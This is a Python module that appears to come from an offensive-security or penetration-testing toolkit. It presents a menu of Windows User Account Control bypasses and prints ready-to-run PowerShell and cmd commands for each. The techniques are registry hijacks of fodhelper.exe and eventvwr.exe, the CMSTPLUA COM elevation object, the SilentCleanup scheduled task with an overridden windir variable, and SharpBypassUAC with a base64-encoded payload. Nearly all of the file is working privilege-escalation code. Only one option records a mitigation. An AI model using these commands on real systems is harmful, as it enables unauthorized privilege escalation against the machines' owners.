"""
Module: UAC Bypass
Techniques: SharpBypassUAC / FODHelper / eventvwr / CMSTPLUA / DiskCleanup
"""
from utils.helpers import *
from config.settings import SESSION
import base64

def run():
    print_banner("UAC BYPASS", "User Account Control Evasion")
    print(f"""
  [1]  SharpBypassUAC (eventvwr/sdclt/computerdefaults)
  [2]  FODHelper Registry Bypass (Manual PowerShell)
  [3]  Eventvwr Registry Bypass  (Manual PowerShell)
  [4]  CMSTPLUA COM Bypass       (PowerShell)
  [5]  Disk Cleanup Scheduled Task Bypass
  [6]  Check UAC level & integrity
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        method = prompt("Method [eventvwr/sdclt/computerdefaults]") or "eventvwr"
        cmd    = prompt("Command to run in high integrity")
        b64    = base64.b64encode(cmd.encode()).decode()
        print(f"""
  {Y}SharpBypassUAC — {method}:{RST}
  .\\SharpBypassUAC.exe -b {method} -e {b64}
  # (payload: base64 of '{cmd}')
""")
        add_finding("UAC Bypass", "High",
                    f"UAC bypassed via {method}",
                    "Set UAC to Always Notify; disable LocalAccountTokenFilterPolicy")

    elif c == "2":
        cmd = prompt("High-integrity command (e.g. powershell.exe)")
        print(f"""
  {Y}FODHelper UAC Bypass:{RST}
  New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force
  New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" \\
    -Name "(default)" -Value "{cmd}" -Force
  New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" \\
    -Name "DelegateExecute" -Value "" -Force
  Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden

  {Y}Cleanup:{RST}
  Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
""")

    elif c == "3":
        cmd = prompt("Command")
        print(f"""
  {Y}Eventvwr UAC Bypass:{RST}
  New-Item "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force
  New-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" \\
    -Name "(default)" -Value "{cmd}" -Force
  Start-Process "C:\\Windows\\System32\\eventvwr.exe" -WindowStyle Hidden
  Remove-Item "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force
""")

    elif c == "4":
        cmd = prompt("Command")
        print(f"""
  {Y}CMSTPLUA COM Bypass:{RST}
  $Trigger = [System.Activator]::CreateInstance(
    [System.Type]::GetTypeFromCLSID("3E5FC7F9-9A51-4367-9063-A120244FBEC7"))
  $Trigger.ShellExecute("{cmd}","","","runas",0)
""")

    elif c == "5":
        cmd = prompt("Command")
        print(f"""
  {Y}Disk Cleanup Task Bypass:{RST}
  $env:windir = "cmd /c {cmd} &"
  schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /I
  Remove-Item Env:windir
""")

    elif c == "6":
        print(f"""
  {Y}UAC & Integrity Check:{RST}
  reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin
  reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA
  reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy
  whoami /groups | findstr /i "label"
  whoami /priv
""")

    pause()
